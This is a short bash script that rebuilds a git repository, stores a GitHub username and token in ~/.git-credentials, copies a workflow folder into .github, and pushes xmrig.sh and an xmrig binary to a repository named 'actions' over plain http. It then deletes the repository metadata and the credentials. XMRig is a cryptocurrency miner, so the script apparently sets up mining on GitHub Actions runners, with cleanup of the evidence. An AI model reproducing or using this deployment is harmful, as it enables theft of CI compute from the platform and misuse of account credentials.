#!/bin/bash
rm -rf .git .github
[ x"$1" = x ] || [ x"$2" = x ] || echo "https://$1:$2@github.com/xxmmxx2021/actions.git" > ~/.git-credentials
git init
cp -raf  wf .github
git add LICENSE README.md  run.sh  xmrig.sh xmrig .github/
git commit -m "first commit"
git branch -M main
[ x"$1" = x ] || git remote add origin http://github.com/$1/actions.git
[ x"$1" = x ] || git push -u origin main 
rm -rf .git .github ~/.git-credentials
